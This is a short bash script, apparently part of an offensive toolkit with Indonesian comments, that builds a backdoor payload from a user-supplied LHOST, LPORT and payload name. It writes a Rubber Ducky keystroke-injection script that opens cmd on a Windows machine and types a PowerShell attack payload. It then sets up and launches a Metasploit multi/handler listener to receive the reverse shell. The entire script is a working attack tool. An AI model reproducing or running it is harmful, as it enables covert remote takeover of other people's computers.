#!/usr/bin/env bash


distro=`awk '{print $1}' /etc/issue`
pwned='python pw_exec.py'


if [ $(id -u) != "0" ]; then

      echo [!]::[cek root] ;
      sleep 2
      echo [✔]Check User = $USER ;
      echo [✔]Distro = $distro ;
      sleep 1
      echo Hellow harus dalam Mode Root ;
      echo ""
          sleep 1
          exit

else

   echo [!]::[Check Dependencies]: ;
   sleep 1
   echo [✔]::[Distro]: $distro ;
   echo [✔]::[Check User]: $USER ;


fi

read -p "Enter LHOST:" lhost;
read -p "Enter LPORT:" lport;
read -p "Enter Payload:" payload;


#membuat payload 
python pw_exec.py $payload $lhost $lport
echo "Backdoor Saved To output Folder" 

clear

payloads=`cat powershell_attack.txt`

#membuat payload rubber 
touch "rubber.txt" 
echo DELAY 1000 > "rubber.txt"
echo GUI r >> "rubber.txt"
echo DELAY 500 >> "rubber.txt"
echo STRING cmd >> "rubber.txt"
echo ENTER >> "rubber.txt"
echo DELAY 1000 >> "rubber.txt"
echo STRING $payloads >> "rubber.txt"
echo ENTER >> "rubber.txt"

cat rubber.txt

read -p "Press enter to continue"

touch "msf.txt"
echo use multi/handler > "msf.txt"
echo set payload $payload >> "msf.txt"
echo set lhost $lhost >> "msf.txt"
echo set lport $lport >> "msf.txt"
echo set ExitOnSession false >> "msf.txt"
exploit -j >> "msf.txt"

msfconsole -r "msf.txt"
#java -jar duckencoder.jar -i rubber.txt -o inject.bin



